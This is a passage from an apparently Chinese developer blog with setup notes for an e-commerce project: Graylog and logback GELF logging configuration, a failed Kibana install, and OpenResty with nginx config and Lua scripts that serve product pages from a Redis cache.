class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">graylog</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mongo</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elasticsearch</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="comment"># Graylog web interface and REST API</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9000</span><span class="string">:9000</span></span><br><span class="line">      <span class="comment"># Syslog TCP</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">1514</span><span class="string">:1514</span></span><br><span class="line">      <span class="comment"># Syslog UDP</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">1514</span><span class="string">:1514/udp</span></span><br><span class="line">      <span class="comment"># GELF TCP</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">12201</span><span class="string">:12201</span></span><br><span class="line">      <span class="comment"># GELF UDP</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">12201</span><span class="string">:12201/udp</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">graylog:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>biz.paluch.logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logstash-gelf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.13.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span></span><br><span class="line">                %d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n</span><br><span class="line">            <span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;GELF&quot;</span> <span class="attr">class</span>=<span class="string">&quot;biz.paluch.logging.gelf.logback.GelfLogbackAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--GrayLog服务地址--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">host</span>&gt;</span>udp:10.211.55.26<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--GrayLog服务端口--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">port</span>&gt;</span>12201<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--当前服务名称--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">facility</span>&gt;</span>ly-registry<span class="tag">&lt;/<span class="name">facility</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">extractStackTrace</span>&gt;</span>true<span class="tag">&lt;/<span class="name">extractStackTrace</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filterStackTrace</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filterStackTrace</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mdcProfiling</span>&gt;</span>true<span class="tag">&lt;/<span class="name">mdcProfiling</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">timestampPattern</span>&gt;</span>yyyy-MM-dd HH:mm:ss,SSS<span class="tag">&lt;/<span class="name">timestampPattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maximumMessageSize</span>&gt;</span>8192<span class="tag">&lt;/<span class="name">maximumMessageSize</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;com.leyou&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span> <span class="attr">additivity</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;GELF&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;GELF&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">成功</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.siegmar<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-gelf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置控制台的输出日志 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;consoleLog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.encoder.LayoutWrappingEncoder&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 定义日志输出的格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">layout</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.classic.PatternLayout&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span></span><br><span class="line">                    %d - [%thread] %-5level %logger&#123;35&#125; - [%line] - %msg%n</span><br><span class="line">                <span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置日志输出到Graylog服务 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;GELF&quot;</span> <span class="attr">class</span>=<span class="string">&quot;de.siegmar.logbackgelf.GelfUdpAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Graylog服务的地址 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">graylogHost</span>&gt;</span>ly-graylog<span class="tag">&lt;/<span class="name">graylogHost</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- UDP Input端口 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">graylogPort</span>&gt;</span>12201<span class="tag">&lt;/<span class="name">graylogPort</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 最大GELF数据块大小（单位：字节），508为建议最小值，最大值为65467 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maxChunkSize</span>&gt;</span>508<span class="tag">&lt;/<span class="name">maxChunkSize</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 是否使用压缩 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">useCompression</span>&gt;</span>true<span class="tag">&lt;/<span class="name">useCompression</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">class</span>=<span class="string">&quot;de.siegmar.logbackgelf.GelfEncoder&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 是否发送原生的日志信息 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includeRawMessage</span>&gt;</span>false<span class="tag">&lt;/<span class="name">includeRawMessage</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includeMarker</span>&gt;</span>true<span class="tag">&lt;/<span class="name">includeMarker</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includeMdcData</span>&gt;</span>true<span class="tag">&lt;/<span class="name">includeMdcData</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includeCallerData</span>&gt;</span>false<span class="tag">&lt;/<span class="name">includeCallerData</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includeRootCauseData</span>&gt;</span>false<span class="tag">&lt;/<span class="name">includeRootCauseData</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 是否发送日志级别的名称，否则默认以数字代表日志级别 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includeLevelName</span>&gt;</span>true<span class="tag">&lt;/<span class="name">includeLevelName</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">shortPatternLayout</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.classic.PatternLayout&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%m%nopex<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">shortPatternLayout</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fullPatternLayout</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.classic.PatternLayout&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d - [%thread] %-5level %logger&#123;35&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fullPatternLayout</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 配置应用名称（服务名称），通过staticField标签可以自定义一些固定的日志字段 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">staticField</span>&gt;</span>app_name:ly-registry<span class="tag">&lt;/<span class="name">staticField</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">staticField</span>&gt;</span>os_arch:$&#123;os.arch&#125;<span class="tag">&lt;/<span class="name">staticField</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">staticField</span>&gt;</span>os_name:$&#123;os.name&#125;<span class="tag">&lt;/<span class="name">staticField</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">staticField</span>&gt;</span>os_version:$&#123;os.version&#125;<span class="tag">&lt;/<span class="name">staticField</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;GELF&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;consoleLog&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="kibana-失败"><a href="#kibana-失败" class="headerlink" title="kibana(失败)"></a>kibana(失败)</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/leyou</span><br><span class="line">tar -zxvf kibana-7.4.2-linux-x86_64.tar.gz</span><br><span class="line"><span class="built_in">cd</span> kibana-7.4.2-linux-x86_64/config</span><br><span class="line">vi kibana.yml</span><br><span class="line">打开端口</span><br><span class="line">server.host: <span class="string">&quot;0.0.0.0&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149305.png" alt="img"></p>
<p>启动</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chown</span> -R leyou /home/leyou/kibana-7.4.2-linux-x86_64 <span class="comment">#在root下赋予权限</span></span><br><span class="line">su leyou <span class="comment">#切换为leyou用户</span></span><br><span class="line"><span class="built_in">cd</span> /home/leyou/kibana-7.4.2-linux-x86_64</span><br><span class="line">bin/kibana</span><br><span class="line"></span><br><span class="line"><span class="comment">#后台启动</span></span><br><span class="line"><span class="built_in">nohup</span> bin/kibana &amp; </span><br><span class="line"></span><br><span class="line"><span class="comment">#端口5601</span></span><br></pre></td></tr></table></figure>

<h2 id="安装Openresty"><a href="#安装Openresty" class="headerlink" title="安装Openresty"></a>安装Openresty</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">安装OpenResty的依赖开发库</span></span><br><span class="line">yum install -y pcre-devel openssl-devel gcc curl</span><br><span class="line"><span class="meta">#</span><span class="language-bash">安装OpenResty仓库</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">在CentOS 系统中添加 `openresty` 仓库，这样就可以便于未来安装或更新我们的软件包（通过 `yum check-update` 命令）。运行下面的命令就可以添加我们的仓库</span></span><br><span class="line">yum install -y yum-utils</span><br><span class="line">yum-config-manager --add-repo https://openresty.org/package/centos/openresty.repo</span><br><span class="line"><span class="meta">#</span><span class="language-bash">安装openresty</span></span><br><span class="line">yum install -y openresty</span><br><span class="line"><span class="meta">#</span><span class="language-bash">opm是OpenResty的一个管理工具，可以帮助我们安装一个第三方的Lua模块。</span></span><br><span class="line">yum install -y openresty-opm</span><br><span class="line"></span><br><span class="line">vi /etc/profile</span><br><span class="line">export NGINX_HOME=/usr/local/openresty/nginx</span><br><span class="line">export PATH=$&#123;NGINX_HOME&#125;/sbin:$PATH</span><br><span class="line">source /etc/profile</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">模板渲染组件并不是OpenResty自带的，需要我们自己来安装。</span></span><br><span class="line">opm get bungle/lua-resty-template</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd /usr/resty</span><br><span class="line">mkdir templates</span><br><span class="line"></span><br><span class="line">vi /usr/resty/conf/nginx.conf</span><br><span class="line">worker_processes  1;</span><br><span class="line">error_log logs/error.log;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">    lua_package_path &quot;/usr/local/openresty/lualib/?.lua;;&quot;;  #lua 模块</span><br><span class="line">    lua_package_cpath &quot;/usr/local/openresty/lualib/?.so;;&quot;;  #c模块</span><br><span class="line">    lua_shared_dict item_local_cache 50m; #共享全局变量，在所有worker间共享</span><br><span class="line"></span><br><span class="line">    default_type  text/html; # 默认响应类型是html</span><br><span class="line">    include leyou.conf;    # 引入一个lua.conf文件</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vi /usr/resty/conf/leyou.conf</span><br><span class="line">upstream backend &#123;</span><br><span class="line"><span class="meta">		#</span><span class="language-bash">page	的服务地址</span></span><br><span class="line">    server ly-page1:8084 max_fails=5 fail_timeout=5s weight=1;</span><br><span class="line">    server ly-page2:8084 max_fails=5 fail_timeout=5s weight=1;</span><br><span class="line">    keepalive 100;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">        set $template_root &quot;/usr/resty/templates&quot;;</span><br><span class="line"></span><br><span class="line">    location ~ /backend/(.*) &#123;</span><br><span class="line">        #internal;</span><br><span class="line">        keepalive_timeout   30s;</span><br><span class="line">        keepalive_requests  1000;</span><br><span class="line">        #支持keep-alive</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Connection &quot;&quot;;</span><br><span class="line"><span class="meta">  #</span><span class="language-bash">将路径重写为第一个正则捕获到的路径  /xxx/xxx</span></span><br><span class="line">        rewrite /backend(/.*) $1 break;</span><br><span class="line">        proxy_pass_request_headers off;</span><br><span class="line">        #more_clear_input_headers Accept-Encoding;</span><br><span class="line">        proxy_next_upstream error timeout;</span><br><span class="line">        proxy_pass http://backend;</span><br><span class="line">    &#125;</span><br><span class="line">   location ~ /item/(\d+).html$ &#123;</span><br><span class="line">    # 获取路径参数</span><br><span class="line">    set $spuId $1;</span><br><span class="line">    # 禁止除了www.wl9939.top以外的请求访问</span><br><span class="line">    #if ($host !~ &quot;^www\.wl9939\.top$&quot;) &#123;</span><br><span class="line">        #return 403;</span><br><span class="line">    #&#125;</span><br><span class="line">    # 关闭缓存/打开缓存</span><br><span class="line">    lua_code_cache on;</span><br><span class="line">    default_type &#x27;text/html&#x27;;</span><br><span class="line">    charset utf-8;</span><br><span class="line">    # 指定请求交给lua/item.lua脚本来处理</span><br><span class="line">    content_by_lua_file lua/item.lua;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vi /etc/hosts</span><br><span class="line">192.168.58.76 ly-page1</span><br><span class="line">192.168.58.153 ly-page2</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">编写一个通用的工具模块，方便后期连接Redis，查询tomcat脚本要定义到`/usr/local/openresty/lualib`目录，因为这里的lua会被扫描到模块库，供其它脚本共享使用。</span></span><br><span class="line">vi /usr/local/openresty/lualib/common.lua</span><br><span class="line">-- 导入redis模块</span><br><span class="line">local redis = require(&quot;resty.redis&quot;) </span><br><span class="line">-- 配置商品的本地缓存 </span><br><span class="line">local local_cache = ngx.shared.item_local_cache</span><br><span class="line">-- 日志</span><br><span class="line">local ngx_log = ngx.log  </span><br><span class="line">local ngx_ERR = ngx.ERR</span><br><span class="line">-- 读取本地缓存</span><br><span class="line">local function cache_get(key)  </span><br><span class="line">    if not local_cache then  </span><br><span class="line">        return nil  </span><br><span class="line">    end  </span><br><span class="line">    return local_cache:get(key)  </span><br><span class="line">end</span><br><span class="line">-- 写入本地缓存</span><br><span class="line">local function cache_set(key, value)  </span><br><span class="line">    if not local_cache then  </span><br><span class="line">        return nil  </span><br><span class="line">    end  </span><br><span class="line">    return local_cache:set(key, value, 10 * 60) --10分钟  </span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">local function close_redis(red)  </span><br><span class="line">    if not red then  </span><br><span class="line">        return  </span><br><span class="line">    end  </span><br><span class="line">    --释放连接(连接池实现)  </span><br><span class="line">    local pool_max_idle_time = 10000 --毫秒  </span><br><span class="line">    local pool_size = 100 --连接池大小  </span><br><span class="line">    local ok, err = red:set_keepalive(pool_max_idle_time, pool_size)  </span><br><span class="line">  </span><br><span class="line">    if not ok then  </span><br><span class="line">        ngx_log(ngx_ERR, &quot;set redis keepalive error : &quot;, err)  </span><br><span class="line">    end  </span><br><span class="line">end  </span><br><span class="line">-- 查询本地缓存，没有则查询redis, ip和port是redis地址，key是查询的key</span><br><span class="line">local function read_cache(ip, port, key) </span><br><span class="line">	-- 尝试读本地缓存</span><br><span class="line">	local resp = cache_get(key)</span><br><span class="line">	-- ngx_log(ngx_ERR, &quot;debug local cache data : &quot;, resp) </span><br><span class="line">	if not resp then</span><br><span class="line">		ngx_log(ngx_ERR, &quot;read local cache fail , key&quot;, key)</span><br><span class="line">		-- 获取一个redis连接</span><br><span class="line">		local red = redis:new()  </span><br><span class="line">		red:set_timeout(1000)  </span><br><span class="line">		local ok, err = red:connect(ip, port)  </span><br><span class="line">		if not ok then  </span><br><span class="line">			ngx_log(ngx_ERR, &quot;connect to redis error : &quot;, err)  </span><br><span class="line">			return close_redis(red)  </span><br><span class="line">		end</span><br><span class="line">		-- 利用get查询</span><br><span class="line">		resp, err = red:get(key) </span><br><span class="line">	end</span><br><span class="line">	-- 查询失败处理</span><br><span class="line">    if not resp then  </span><br><span class="line">        ngx_log(ngx_ERR, &quot;get redis content error : &quot;, err)  </span><br><span class="line">        return close_redis(red)  </span><br><span class="line">    end  </span><br><span class="line">  </span><br><span class="line">    --得到的数据为空处理  </span><br><span class="line">    if resp == ngx.null then  </span><br><span class="line">        resp = nil  </span><br><span class="line">    end</span><br><span class="line">	cache_set(key, resp)</span><br><span class="line">    close_redis(red)  </span><br><span class="line">    return resp  </span><br><span class="line">end</span><br><span class="line">-- 查询redis的方法 ip和port是redis地址，keys是查询的key，数组格式</span><br><span class="line">local function read_redis(ip, port, key)  </span><br><span class="line">	-- 获取一个连接</span><br><span class="line">    local red = redis:new()  </span><br><span class="line">    red:set_timeout(1000)  </span><br><span class="line">    local ok, err = red:connect(ip, port)  </span><br><span class="line">    if not ok then  </span><br><span class="line">        ngx_log(ngx_ERR, &quot;connect to redis error : &quot;, err)  </span><br><span class="line">        return close_redis(red)  </span><br><span class="line">    end  </span><br><span class="line">    local resp = nil</span><br><span class="line">	-- 利用get查询 </span><br><span class="line">    resp, err = red:get(key)  </span><br><span class="line">	-- 查询失败处理</span><br><span class="line">    if not resp then  </span><br><span class="line">        ngx_log(ngx_ERR, &quot;get redis content error : &quot;, err)  </span><br><span class="line">        return close_redis(red)  </span><br><span class="line">    end  </span><br><span class="line">  </span><br><span class="line">    --得到的数据为空处理  </span><br><span class="line">    if resp == ngx.null then  </span><br><span class="line">        resp = nil  </span><br><span class="line">    end  </span><br><span class="line">    close_redis(red)  </span><br><span class="line">    return resp  </span><br><span class="line">end </span><br><span class="line">-- 查询http请求的方法，path是请求路径，args是参数，table格式</span><br><span class="line">local function read_http(path, args) </span><br><span class="line">	-- 默认查询地址走 /backend/page/,内部转发到8083端口</span><br><span class="line">    local resp = ngx.location.capture(&quot;/backend/page&quot;..path, &#123;  </span><br><span class="line">        method = ngx.HTTP_GET,  </span><br><span class="line">        args = args  </span><br><span class="line">    &#125;)  </span><br><span class="line">	-- 查询失败的处理</span><br><span class="line">    if not resp then  </span><br><span class="line">        ngx_log(ngx_ERR, &quot;request error&quot;)  </span><br><span class="line">        return  </span><br><span class="line">    end</span><br><span class="line">	-- 返回状态码不是200就报错</span><br><span class="line">    if resp.status ~= 200 then  </span><br><span class="line">        ngx_log(ngx_ERR, &quot;request error, status :&quot;, resp.status)  </span><br><span class="line">        return  </span><br><span class="line">    end</span><br><span class="line">    return resp.body  </span><br><span class="line">end  </span><br><span class="line">-- 将方法导出</span><br><span class="line">local _M = &#123;  </span><br><span class="line">    read_redis = read_redis,  </span><br><span class="line">    read_cache = read_cache,  </span><br><span class="line">    read_http = read_http  </span><br><span class="line">&#125;  </span><br><span class="line">return _M </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">页面模版</span></span><br><span class="line">vi /usr/resty/lua/item.lua</span><br><span class="line">-- 导入模块</span><br><span class="line">local common = require(&quot;common&quot;)</span><br><span class="line">local read_redis = common.read_redis  </span><br><span class="line">local read_http = common.read_http</span><br><span class="line">local read_cache = common.read_cache</span><br><span class="line">local cjson = require(&quot;cjson&quot;)</span><br><span class="line">local template = require(&quot;resty.template&quot;)  </span><br><span class="line">-- 常用变量和方法</span><br><span class="line">local ngx_log = ngx.log  </span><br><span class="line">local ngx_ERR = ngx.ERR  </span><br><span class="line">local ngx_exit = ngx.exit  </span><br><span class="line">local ngx_print = ngx.print  </span><br><span class="line">local ngx_re_match = ngx.re.match  </span><br><span class="line"></span><br><span class="line">-- 获取商品id</span><br><span class="line">local spuId = ngx.var.spuId</span><br><span class="line">-- 获取spu</span><br><span class="line">local spuKey = &quot;page:spu:id:&quot;..spuId </span><br><span class="line">local spuInfoStr = read_redis(&quot;81.68.97.129&quot;, 6379, spuKey)  </span><br><span class="line">if not spuInfoStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;redis not found spu info, back to http, spuId : &quot;, spuId)  </span><br><span class="line">   spuInfoStr = read_http(&quot;/spu/&quot;..spuId, &#123;&#125;)  </span><br><span class="line">end  </span><br><span class="line">if not spuInfoStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;http not found spuInfoStr info, spuId : &quot;, spuId)  </span><br><span class="line">   return ngx_exit(404)  </span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">-- 获取sku</span><br><span class="line">local skuKey = &quot;page:sku:id:&quot;..spuId </span><br><span class="line">local skuInfoStr = read_redis(&quot;81.68.97.129&quot;, 6379, skuKey)  </span><br><span class="line">if not skuInfoStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;redis not found sku info, back to http, spuId : &quot;, spuId)  </span><br><span class="line">   skuInfoStr = read_http(&quot;/sku/&quot;..spuId, &#123;&#125;)  </span><br><span class="line">end  </span><br><span class="line">if not skuInfoStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;http not found skuInfoStr info, spuId : &quot;, spuId)  </span><br><span class="line">   return ngx_exit(404)  </span><br><span class="line">end</span><br><span class="line">-- 获取spuDetail</span><br><span class="line">local detailKey = &quot;page:detail:id:&quot;..spuId </span><br><span class="line">local detailInfoStr = read_redis(&quot;81.68.97.129&quot;, 6379, detailKey)  </span><br><span class="line">if not detailInfoStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;redis not found detail info, back to http, spuId : &quot;, spuId)  </span><br><span class="line">   detailInfoStr = read_http(&quot;/detail/&quot;..spuId, &#123;&#125;)  </span><br><span class="line">end  </span><br><span class="line">if not detailInfoStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;http not found detailInfoStr info, spuId : &quot;, spuId)  </span><br><span class="line">   return ngx_exit(404)  </span><br><span class="line">end</span><br><span class="line">-- 获取categories</span><br><span class="line">local spuInfo = cjson.decode(spuInfoStr)  </span><br><span class="line">local cid3 = spuInfo[&quot;categoryIds&quot;][3]</span><br><span class="line">local categoryKey = &quot;page:category:id:&quot;..cid3 </span><br><span class="line">local categoryStr = read_cache(&quot;81.68.97.129&quot;, 6379, categoryKey)  </span><br><span class="line">if not categoryStr then  </span><br><span class="line">   local idStr = table.concat(spuInfo[&quot;categoryIds&quot;],&quot;,&quot;);</span><br><span class="line">   ngx_log(ngx_ERR, &quot;redis not found category info, back to http, categoryIds : &quot;, idStr)  </span><br><span class="line">   categoryStr = read_http(&quot;/categories/&quot;, &#123;ids  = idStr&#125;)</span><br><span class="line">end  </span><br><span class="line">if not categoryStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;http not found categoryStr info, categoryId : &quot;, cid3)  </span><br><span class="line">   return ngx_exit(404)  </span><br><span class="line">end</span><br><span class="line">-- 获取品牌  </span><br><span class="line">local brandId = spuInfo[&quot;brandId&quot;]</span><br><span class="line">local brandKey = &quot;page:brand:id:&quot;..brandId </span><br><span class="line">local brandStr = read_cache(&quot;81.68.97.129&quot;, 6379, brandKey)  </span><br><span class="line">if not brandStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;redis not found brand info, back to http, brandId : &quot;, brandId)  </span><br><span class="line">   brandStr = read_http(&quot;/brand/&quot;..brandId, &#123;&#125;)</span><br><span class="line">end  </span><br><span class="line">if not brandStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;http not found brandStr info, brandId : &quot;, brandId)  </span><br><span class="line">   return ngx_exit(404)  </span><br><span class="line">end</span><br><span class="line">-- 获取规格</span><br><span class="line">local specKey = &quot;page:spec:id:&quot;..cid3 </span><br><span class="line">local specStr = read_cache(&quot;81.68.97.129&quot;, 6379, specKey)  </span><br><span class="line">if not specStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;redis not found spec info, back to http, cid3 : &quot;, cid3)  </span><br><span class="line">   specStr = read_http(&quot;/spec/&quot;..cid3, &#123;&#125;)</span><br><span class="line">end  </span><br><span 